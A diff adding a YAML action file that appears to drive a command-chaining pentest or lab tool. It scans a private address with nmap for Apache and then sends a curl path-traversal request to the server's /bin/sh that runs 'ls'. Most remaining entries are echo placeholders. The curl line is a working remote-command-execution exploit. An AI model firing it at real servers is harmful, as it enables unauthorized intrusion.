@@ -1,0 +1,26 @@
+actions:
+
+  test:
+    1: 
+      operator: OR
+      1a: nmap -sV 192.168.2.10 | fgrep "Apache" | awk '/open/'
+      1b: echo "test kali"
+    2: curl "http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo;ls"
+    3: echo "OK"
+
+  test2:
+    1: 
+      operator: AND
+      1a: nmap -sV 192.168.2.10 | fgrep "Apache" | awk '/open/'
+      1b: echo "test kali 2"
+      1c: echo "test 3"
+    2: curl "http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "A=|echo;ls"
+    3: echo "OK 2"
+
+  bho:
+    1: echo "test r1"
+    2: echo "OK r1"
+
+
+  testr2:
+    1: echo "test r2"
